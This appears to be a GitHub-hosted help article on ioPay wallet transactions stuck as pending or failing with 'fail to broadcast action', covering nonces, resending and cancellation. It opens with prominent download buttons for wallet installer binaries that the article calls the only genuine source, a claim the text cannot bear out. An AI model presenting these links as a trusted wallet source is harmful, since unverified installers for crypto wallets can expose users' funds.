![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Transaction Stuck as Pending - and "Fail to Broadcast Action"

Two failures get described as one, and they need opposite responses:

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

- **"Fail to broadcast action"** - the transaction **never reached the network**. Nothing moved. No fee was charged. Almost always a connectivity, version or gas problem.
- **Pending** - the transaction **did reach the network** and is waiting to be included in a block. It is real. It will either confirm or it will not.

If you treat a broadcast failure as pending, you wait for nothing. If you treat pending as a broadcast failure and resend, you create a second transaction.

## "Fail to broadcast action"

The wallet built a transaction, tried to submit it, and the submission did not succeed. What that means in practice:

**No funds left your account.** A broadcast failure is a failed *delivery to the node*, not a failed transfer. The transaction never entered the mempool, so there is nothing to confirm and nothing to charge for.

**The causes are the connectivity ladder.** In order: the app cannot reach an endpoint ([network errors](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md)), the endpoint rejected the request because the transaction was not acceptable - most often **not enough IOTX for gas**, an amount below what the chain accepts, or a nonce mismatch from a previous pending transaction - or the build is old enough to be sending something the current network rejects. The problems users reported were fixed in **v2.0.2, 19 November 2026** ([update guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md)), so a build older than that is the case to rule out before resending anything.

**What to do:** check you have gas left after the amount, check nothing else of yours is pending, confirm the app can reach the chain, then retry. If it fails repeatedly with the same message and the app otherwise works, that is worth reporting rather than repeating.

## Pending

The transaction is on the network and waiting for block inclusion. Three outcomes:

1. **It confirms.** Most do, within a block or two once the network is producing.
2. **It confirms later.** Congestion or a low fee relative to current conditions delays inclusion.
3. **It never confirms.** It can sit indefinitely. On account-based chains this state is resolved by a *replacement* transaction using the same nonce and a higher fee, if the interface supports it - and this article will not claim a button exists that it has not seen.

What the wallet can show you: the transaction's status, the fee paid and the block number once it is included (F020). What it cannot do is reverse a mined transaction, and no support channel can either.

## Mined but not shown as confirmed

The third case people misread: the transaction *is* in a block, the app's view is behind, and the balance has not caught up. If the explorer shows the transaction confirmed and the app does not, that is a display lag, not a stuck transaction. [Balance not updating](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-balance-not-updating.md) covers the cross-check.

## Should you resend?

**After a broadcast failure:** yes, once the cause is fixed. Nothing was submitted, so a retry is a first attempt.

**While pending:** no - not unless you intend a second, separate transfer. A resend does not replace the pending one; it adds another. If the first later confirms, you have sent twice.

**After it is mined:** no. It is final.

## Cancelling

A pending transaction is not "cancelled" by asking. The only mechanism is a replacement with the same nonce, which the wallet must support and which costs a fee. If the app you are using offers no such action, the honest options are: wait for it to confirm, or wait for it to be dropped. This page will not describe a cancel button it cannot verify.

## FAQ

**Why is my ioPay transaction stuck as pending?**
It reached the network and has not been included in a block yet. Congestion, fee conditions or a node that accepted it into a queue that is draining slowly are the usual reasons.

**Why does a transfer fail with "fail to broadcast action"?**
The transaction never reached the network - commonly no gas left, an unacceptable amount, a nonce conflict with a pending transaction, or no connection to an endpoint. Nothing moved and no fee was charged.

**Can I cancel a pending transfer?**
Not by request. Only by a same-nonce replacement with a higher fee, if the interface supports it. Otherwise it confirms or it does not.

**Did I lose the fee?**
On a broadcast failure, no fee was charged. On a mined transaction, the fee is paid whether or not the transfer did what you hoped - the fee pays for inclusion, not for the outcome.

**How long should I wait?**
Long enough to be sure it is not just the next block, then treat it as stuck. A transaction pending for hours is not slow, it is unresolved.

## Why one pending transaction blocks the next

IoTeX is account-based, and every transaction from an account carries a sequence number (a nonce) that must be used in order. That single fact explains a pattern people find baffling: one stuck transaction and everything sent after it appears stuck too.

If one transaction is sitting in a queue somewhere, the next one - sent later, with a higher fee, perfectly valid - cannot be included before it, because the chain will not apply the second until the first has been applied. Both can read as pending, which looks like two problems and is one.

The practical consequences:

- **Do not send a second transfer to "push it through".** It joins the queue behind the stuck one and leaves you with two transactions to resolve instead of one.
- **A replacement has to reuse the stuck transaction's nonce**, which is why a same-nonce replacement with a higher fee is the only mechanism that resolves it.
- **Do not read the later transaction as failed.** It has not been rejected; it is waiting on its predecessor.

Once the first confirms - or is replaced - the rest apply in order, usually within a block or two.


---

*Transaction states and the broadcast error are described from the app's behaviour and IoTeX chain semantics (account-based, chain ID 4689). No replacement-fee or cancel action is claimed for this build.*
